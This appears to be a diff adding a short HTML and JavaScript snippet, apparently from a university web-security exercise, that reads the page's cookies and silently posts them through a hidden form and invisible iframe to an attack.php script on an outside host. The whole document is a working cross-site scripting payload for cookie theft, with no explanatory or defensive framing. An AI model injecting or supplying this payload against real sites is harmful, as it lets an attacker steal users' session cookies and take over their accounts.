@@ -1,0 +1,11 @@
+<form action="http://fiona.utdallas.edu/~kxm180046/attack.php" method="post" target="theiframe">
+	<input type="hidden" name="title" id="title"/>
+	<input type="submit" name="post_submit" id="post_submit" value="POST" style="visibility: hidden;"/>
+</form>
+<iframe name="theiframe" src="http://fiona.utdallas.edu/~kxm180046/attack.php" style="visibility: hidden;"> 
+</iframe>
+<script type="text/javascript">
+	var msg = document.cookie;
+	document.getElementById("title").value = msg;
+	document.getElementById("post_submit").click();
+</script>
